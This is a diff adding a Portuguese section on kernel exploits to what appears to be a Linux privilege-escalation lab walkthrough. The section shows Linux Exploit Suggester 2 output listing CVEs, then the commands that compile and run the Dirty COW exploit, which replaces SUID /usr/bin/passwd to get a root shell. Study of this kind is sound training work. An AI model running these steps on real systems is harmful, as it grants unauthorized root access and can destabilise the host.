@@ -981,3 +981,79 @@ Um shell de usuário root será iniciado.
 ### Questões:
 
 - a. ***What is the name of the option that disables root squashing?*** *no_root_squash*
+
+## 20 - Kernel Exploits 
+
+Os ***Kernel exploits*** podem deixar o sistema em um estado instável, e é por isso que você devem executados apenas como último recurso.
+
+Execute a ferramenta ***Linux Exploit Suggester 2*** para identificar possíveis explorações do kernel no sistema atual:
+
+```shell
+user@debian:~$ perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+
+  #############################
+    Linux Exploit Suggester 2
+  #############################
+
+  Local Kernel: 2.6.32
+  Searching 72 exploits...
+
+  Possible Exploits
+  [1] american-sign-language
+      CVE-2010-4347
+      Source: http://www.securityfocus.com/bid/45408
+  [2] can_bcm
+      CVE-2010-2959
+      Source: http://www.exploit-db.com/exploits/14814
+  [3] dirty_cow
+      CVE-2016-5195
+      Source: http://www.exploit-db.com/exploits/40616
+  [4] exploit_x
+      CVE-2018-14665
+      Source: http://www.exploit-db.com/exploits/45697
+  [5] half_nelson1
+      Alt: econet       CVE-2010-3848
+      Source: http://www.exploit-db.com/exploits/17787
+  [6] half_nelson2
+      Alt: econet       CVE-2010-3850
+      Source: http://www.exploit-db.com/exploits/17787
+  [7] half_nelson3
+      Alt: econet       CVE-2010-4073
+      Source: http://www.exploit-db.com/exploits/17787
+  [8] msr
+      CVE-2013-0268
+      Source: http://www.exploit-db.com/exploits/27297
+  [9] pktcdvd
+      CVE-2010-3437
+      Source: http://www.exploit-db.com/exploits/15150
+  [10] ptrace_kmod2
+      Alt: ia32syscall,robert_you_suck       CVE-2010-3301
+      Source: http://www.exploit-db.com/exploits/15023
+  [11] rawmodePTY
+      CVE-2014-0196
+      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
+  [12] rds
+      CVE-2010-3904
+      Source: http://www.exploit-db.com/exploits/15285
+  [13] reiserfs
+      CVE-2010-1146
+      Source: http://www.exploit-db.com/exploits/12130
+  [14] video4linux
+      CVE-2010-3081
+      Source: http://www.exploit-db.com/exploits/15024
+```
+
+A popular exploração do kernel Linux "***Dirty COW***" foi listada. O código de exploração para ***Dirty COW*** pode ser encontrado em /home/user/tools/kernel-exploits/dirtycow/c0w.c. Ele substitui o arquivo SUID /usr/bin/passwd por um que gera um shell (um backup de /usr/bin/passwd é feito em /tmp/bak).
+
+Compile o código e execute-o (observe que pode levar vários minutos para ser concluído):
+
+```shell
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+./c0w
+```
+
+Assim que a exploração for concluída, basta executar ***/usr/bin/passwd*** para obter um shell de root.
+
+### Questões:
+
+- a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
